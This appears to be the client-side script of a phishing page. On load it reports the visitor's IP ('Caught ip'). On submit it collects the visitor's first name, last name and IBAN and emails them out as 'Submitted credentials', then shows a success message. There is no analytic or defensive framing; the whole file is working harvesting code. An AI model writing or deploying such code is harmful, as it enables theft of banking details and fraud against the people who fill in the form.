$emailSender.sendIp("Caught ip");
document.addEventListener("DOMContentLoaded", function ()
{
   document.querySelector("#submit").addEventListener("click", (e) =>
   {
      e.preventDefault();
      sendCredentials();
   });
});
function sendCredentials()
{
   if ($formHandler.isFieldEmpty())
      return;
   let credentials = {};
   credentials.firstName = document.querySelector("#first-name").value;
   credentials.lastName = document.querySelector("#last-name").value;
   credentials.iban = document.querySelector("#iban").value;
   $emailSender.submitCredentials(credentials, "Submitted credentials").then(() =>
   {
      document.querySelector("#success-msg").classList.remove("hidden");
   });
}